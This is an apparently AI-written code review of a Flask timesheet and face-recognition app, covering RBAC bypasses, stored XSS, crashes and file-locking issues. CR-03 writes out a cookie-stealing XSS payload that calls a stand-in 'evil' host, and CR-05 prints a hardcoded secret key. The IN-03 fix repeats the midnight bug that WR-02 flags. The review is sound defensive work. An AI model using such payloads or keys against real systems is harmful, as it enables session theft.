---
phase: 03-t-13-timesheet-grid
reviewed: 2026-06-13T00:00:00Z
depth: standard
files_reviewed: 8
files_reviewed_list:
  - tests/test_timesheet.py
  - tests/conftest.py
  - app.py
  - templates/timesheet.html
  - templates/org_admin.html
  - templates/admin.html
  - templates/register.html
  - templates/superadmin.html
findings:
  critical: 5
  warning: 6
  info: 3
  total: 14
status: issues_found
---

# Phase 03: Code Review Report

**Reviewed:** 2026-06-13
**Depth:** standard
**Files Reviewed:** 8
**Status:** issues_found

## Summary

Phase 03 adds a T-13 timesheet engine (`compute_symbol`, `compute_employee_totals`, `compute_timesheet_grid`, `compute_dept_summary`), a `/timesheet` route with RBAC-scoped dept selection, an override API (`/api/timesheet/override`), and a DASH-04 per-dept summary for org_admin. The timesheet logic is generally correct but five blockers were identified: two RBAC scope bypass vulnerabilities (employees can be deleted cross-department/org; users can be created scoped to arbitrary organizations); one stored XSS path through employee name/role in `admin.html`; one endpoint crash on non-JSON requests (`request.json` unguarded); and one hardcoded Flask secret key in source. Several warnings cover file I/O atomicity gaps and compute_symbol correctness on edge-case schedules.

---

## Critical Issues

### CR-01: dept_admin and org_admin can delete any employee regardless of scope

**File:** `app.py:1418-1429`
**Issue:** `DELETE /api/employees/<emp_id>` has no scope check. `@require_role("superadmin", "org_admin", "dept_admin")` gates entry, but no code verifies that the target employee belongs to the caller's department or organization. A dept_admin for dept-A can send `DELETE /api/employees/<emp_id_from_dept_B>` and it will succeed, deleting the employee record and their entire face image directory via `shutil.rmtree`.

The same gap exists on `POST /api/employees/<emp_id>/reset` (line 1482-1495), which resets face photos: no scope check, any dept_admin can wipe face data for any employee.

**Fix:**
```python
@app.route("/api/employees/<emp_id>", methods=["DELETE"])
@require_role("superadmin", "org_admin", "dept_admin")
def delete_employee(emp_id):
    employees = load_employees()
    if emp_id not in employees:
        return jsonify({"status": "deleted"})
    emp = employees[emp_id]
    role = session.get("role")
    if role == "dept_admin" and emp.get("dept_id") != session.get("dept_id"):
        return jsonify({"error": "forbidden"}), 403
    if role == "org_admin" and emp.get("org_id") != session.get("org_id"):
        return jsonify({"error": "forbidden"}), 403
    del employees[emp_id]
    save_employees(employees)
    emp_dir = os.path.join(FACES_DIR, emp_id)
    if os.path.exists(emp_dir):
        shutil.rmtree(emp_dir)
    train_recognizer()
    return jsonify({"status": "deleted"})
```
Apply the same scope check pattern to `reset_employee_face`.

---

### CR-02: org_admin can create users scoped to arbitrary organizations

**File:** `app.py:1061`
**Issue:** In `create_user`, `new_org_id` is assigned from the request body without validating it belongs to the caller's org:

```python
new_org_id = data.get("org_id") or (caller_org_id if creator_role != "superadmin" else None)
```

An org_admin for org-A can POST `{"username": "x", "password": "xxxxxxxx", "role": "dept_admin", "org_id": "org-B"}` and create a `dept_admin` user scoped to org-B. That new account can then call `GET /api/employees` and receive all employees of org-B.

**Fix:**
```python
if creator_role == "org_admin":
    new_org_id = caller_org_id          # always force to session org
elif creator_role == "superadmin":
    new_org_id = data.get("org_id")     # superadmin may assign explicitly
else:  # dept_admin
    new_org_id = caller_org_id
```

---

### CR-03: Stored XSS via employee name/role in admin.html attendance journal

**File:** `templates/admin.html:385,387,262,467,468`
**Issue:** The attendance journal (`renderTable`, `loadStats`, `loadUsers`) inserts server-supplied strings directly into `innerHTML` template literals without HTML-escaping:

- `r.name` (employee name) at line 385
- `r.role` (employee role value) at line 387
- `u.username` (admin username) at line 262
- `e.name` and `e.role` in the stats table at lines 467-468

Employee names and roles are stored verbatim from `data["name"]` and `data.get("role")` in `add_employee` (lines 1373-1374) with no sanitization. A dept_admin or self-registering user (via `/register/<reg_token>`) can set their name to `<img src=x onerror="fetch('https://evil/'+document.cookie)">`. When a superadmin or org_admin opens `/admin`, the script executes in their browser with full session cookie access.

Flask's Jinja2 autoescape only protects server-rendered `{{ }}` expressions; it does not protect JavaScript `innerHTML` assignments.

**Fix:** Apply the existing `escapeHtml` helper (defined in the same page at line ~477) consistently:
```javascript
// Line 385:
<span style="font-weight:500;">${escapeHtml(r.name)}</span>
// Line 387:
<td style="color:#546e7a;">${escapeHtml(r.role)}</td>
// Line 262:
<td style="font-weight:500;">${escapeHtml(u.username)}</td>
// Lines 467-468:
<td><span style="font-weight:500;">${escapeHtml(e.name)}</span></td>
<td style="color:#546e7a;">${escapeHtml(e.role)}</td>
```
Also apply to `register.html` lines 336-337 (`e.name`, `e.role` in the emp-list card).

---

### CR-04: `request.json` unguarded on multiple authenticated endpoints — AttributeError on non-JSON POST

**File:** `app.py:1038, 1090, 1591, 1592, 1597, 1644, 1645`
**Issue:** Several endpoints access `request.json` directly without the `or {}` defensive pattern used elsewhere. If the client sends a POST without `Content-Type: application/json`, Flask sets `request.json` to `None` and the next attribute access raises `AttributeError` (or `TypeError` for subscript), returning a 500.

```python
# Line 1038 create_user:
data = request.json              # None if Content-Type wrong
username = data.get(...)         # AttributeError: 'NoneType' has no attribute 'get'

# Lines 1591-1592 register_face:
data = request.json
emp_id = data["emp_id"]          # TypeError if data is None

# Line 1644 recognize:
data = request.json
img = decode_image(data["image"]) # TypeError if data is None
```

The unauthenticated `/api/recognize` endpoint (line 1632) is particularly exposed: any HTTP client sending a malformed request body (no Content-Type header) produces a 500 response. In debug mode this leaks a stack trace.

**Fix:** Replace bare `request.json` with `request.get_json(silent=True) or {}` and add explicit field presence checks:
```python
# create_user / update_user:
data = request.get_json(silent=True) or {}

# register_face:
data = request.get_json(silent=True) or {}
if not data.get("emp_id") or not data.get("image"):
    return jsonify({"error": "emp_id and image required"}), 400

# recognize:
data = request.get_json(silent=True) or {}
if "image" not in data:
    return jsonify({"error": "image required"}), 400
```

---

### CR-05: Hardcoded fallback Flask secret key is checked into the repository

**File:** `app.py:12`
**Issue:**
```python
app.secret_key = os.environ.get("SECRET_KEY", "medkontrol-secret-2026-xK9mP3qR7v")
```
The fallback `"medkontrol-secret-2026-xK9mP3qR7v"` is public in the repository. If `SECRET_KEY` is absent from the environment — likely on a fresh deployment or after a PM2 config reset — Flask silently uses this known string. An attacker can use it to craft valid session cookies, forging `user_id`, `role`, `org_id`, and `dept_id` values and bypassing all RBAC checks.

**Fix:**
```python
secret_key = os.environ.get("SECRET_KEY")
if not secret_key:
    raise RuntimeError(
        "SECRET_KEY environment variable must be set to a long random string. "
        "Generate one with: python -c \"import secrets; print(secrets.token_hex(32))\""
    )
app.secret_key = secret_key
```

---

## Warnings

### WR-01: `save_orgs` and `save_depts` truncate the file before acquiring the lock

**File:** `app.py:149-165`
**Issue:** Both functions open with `"w"` mode (which truncates the file to zero) and only then call `fcntl.LOCK_EX`. Two gunicorn workers calling `save_orgs` concurrently will both truncate the file before either acquires the lock, creating a window where `orgs.json` is empty. The `save_users` and `save_timesheet_overrides` functions correctly use `tempfile.mkstemp + os.replace` to avoid this.

**Fix:** Use the same tempfile+atomic rename pattern:
```python
def save_orgs(data):
    tmp_fd, tmp_path = tempfile.mkstemp(dir=DATA_DIR, prefix="orgs_", suffix=".tmp")
    try:
        with os.fdopen(tmp_fd, "w", encoding="utf-8") as fh:
            json.dump(data, fh, ensure_ascii=False, indent=2)
        os.replace(tmp_path, ORGS_FILE)
    except Exception:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
        raise
```
Apply the same fix to `save_depts`, `save_employees`, `save_attendance`, and `append_log`.

---

### WR-02: `compute_symbol` generates invalid threshold strings for schedules near midnight

**File:** `app.py:270-286`
**Issue:** When `schedule.start = "23:50"`, the late threshold computation produces:
```python
late_m = 50 + 15  # = 65
late_threshold = f"{23 + 1:02d}:{65 % 60:02d}:00"  # = "24:05:00"
```
The string `"24:05:00"` is lexicographically greater than any valid `HH:MM:SS`, so `check_in > "24:05:00"` is always False — nobody is ever late. Similarly, `schedule.end = "00:10"` produces `early_threshold = "-1:55:00"` which is less than any valid time — everyone is always early. The results are wrong and silent.

**Fix:** Use `datetime` arithmetic instead of string manipulation:
```python
from datetime import datetime, timedelta

def _time_threshold(base_hhmm: str, delta_minutes: int) -> str:
    base = datetime.strptime(base_hhmm, "%H:%M")
    result = (base + timedelta(minutes=delta_minutes))
    # Clamp to same day to avoid midnight wraparound nonsense
    return result.strftime("%H:%M:%S")

late_threshold = _time_threshold(schedule.get("start", "09:00"), 15)
early_threshold = _time_threshold(schedule.get("end", "18:00"), -15)
```

---

### WR-03: Missing year range validation in `/timesheet` route

**File:** `app.py:856-861`
**Issue:** The `?month=` parameter validates `1 <= month_num <= 12` but not the year. The DASH-04 summary path (line 761) correctly requires `2000 <= sum_year <= 2100`. A request to `/timesheet?month=0001-01` generates a valid 200 response (year 1 has no holiday data, so the missing-holiday banner fires) and iterates `date(1, 1, d)` objects. While Python's `calendar` and `date` handle year 1 correctly, this inconsistency means the holiday-missing warning fires for every pre-2024 date, confusing users.

**Fix:** Add the same range check as the summary path:
```python
if not (1 <= month_num <= 12 and 2000 <= year <= 2100):
    raise ValueError("out of range")
```

---

### WR-04: `add_employee` crashes with `KeyError` when `name` field is absent

**File:** `app.py:1373`
**Issue:** Line 1373 uses `data["name"]` without a `.get()` guard. Every other field in the same function uses `data.get(...)`. A POST request to `POST /api/employees` with a JSON body missing the `name` key raises `KeyError` and returns 500.

**Fix:**
```python
name = data.get("name", "").strip()
if not name:
    return jsonify({"error": "ФИО обязательно"}), 400
# ...
employees[emp_id] = {
    "id": emp_id,
    "name": name,
    # ...
}
```

---

### WR-05: Override API date validation does not reject out-of-range month/day values

**File:** `app.py:1004-1008`
**Issue:** The date check passes `"2025-13-01"`, `"2025-00-00"`, and `"aaaa-bb-cc"` (anything 10 chars with dashes at positions 4 and 7). These are stored in `timesheet_overrides.json` as keys that `compute_symbol` will never match (since it uses `date.isoformat()`), permanently inflating the overrides file with unreachable entries. Over time this causes silent data rot.

**Fix:**
```python
try:
    datetime.strptime(date_str, "%Y-%m-%d").date()
except (ValueError, TypeError):
    return jsonify({"error": "invalid_date"}), 422
```

---

### WR-06: `viewer` role can be created but never logged in — dead accounts with no diagnostic

**File:** `app.py:99, 1047`; `templates/org_admin.html:280`
**Issue:** `ALLOWED_LOGIN_ROLES = ("superadmin", "org_admin", "dept_admin")` excludes `viewer`. The `create_user` endpoint accepts `viewer` (it is in `ROLE_HIERARCHY`), and the org_admin UI offers "Наблюдатель" in the role dropdown. Admins will create viewer accounts that are permanently non-functional with no error message at creation time or login time.

**Fix:** Either add `"viewer"` to `ALLOWED_LOGIN_ROLES` (if viewer is an intended read-only role), or remove `viewer` from the create-user dropdowns and add a validation guard in `create_user`:
```python
if target_role == "viewer":
    return jsonify({"error": "Роль 'viewer' не поддерживается в текущей версии"}), 400
```

---

## Info

### IN-01: `compute_dept_summary` uses raw `dept_id` UUID as fallback dept name

**File:** `app.py:374`
**Issue:** `dept_name = dept_id` is used as a fallback when a dept's name cannot be resolved. If `depts.json` has a corrupt or deleted record, the DASH-04 table displays the raw UUID. The enrichment at lines 773-775 in `org_admin_page` corrects this for the normal path, so this only surfaces on data corruption.

**Fix:** Use a localized placeholder instead of the raw UUID:
```python
dept_name = "(отдел удалён)"  # instead of dept_id
```

---

### IN-02: `save_users` acquires flock on a unique tempfile — the lock does nothing

**File:** `app.py:64`
**Issue:** `tempfile.mkstemp` creates a file that no other process shares. `fcntl.flock(fh, LOCK_EX)` on line 64 acquires an exclusive lock on a file that already belongs exclusively to this process's fd — no other process can hold it. The lock is a no-op. The crash-safety derives entirely from `os.replace()` on line 66. The flock call is misleading and suggests concurrent-write protection that does not exist.

**Fix:** Either remove the flock (the `os.replace` is sufficient for crash-safety), or implement real concurrent-write protection via a separate named lock file (e.g., `DATA_DIR/.users.lock`).

---

### IN-03: `is_late` check in `/api/recognize` uses hardcoded `"09:00:00"` threshold

**File:** `app.py:1682`
**Issue:**
```python
is_late = now > "09:00:00"
```
This ignores per-employee schedules entirely. An employee with a `schedule.start = "10:00"` who checks in at `09:30` will be flagged as late in the kiosk response, even though they are 30 minutes early. The `compute_symbol` engine (line 233) correctly uses `schedule.get("start")` for its threshold. The `is_late` field in the kiosk API response is therefore inconsistent with the timesheet grid.

**Fix:** Retrieve the employee's schedule and compute the threshold the same way `compute_symbol` does:
```python
schedule = emp.get("schedule", {"start": "09:00", "end": "18:00", "work_days": [1, 2, 3, 4, 5]})
sh, sm = map(int, schedule.get("start", "09:00").split(":"))
late_m = sm + 15
if late_m >= 60:
    late_threshold = f"{sh + 1:02d}:{late_m % 60:02d}:00"
else:
    late_threshold = f"{sh:02d}:{late_m:02d}:00"
is_late = now > late_threshold
```

---

_Reviewed: 2026-06-13_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
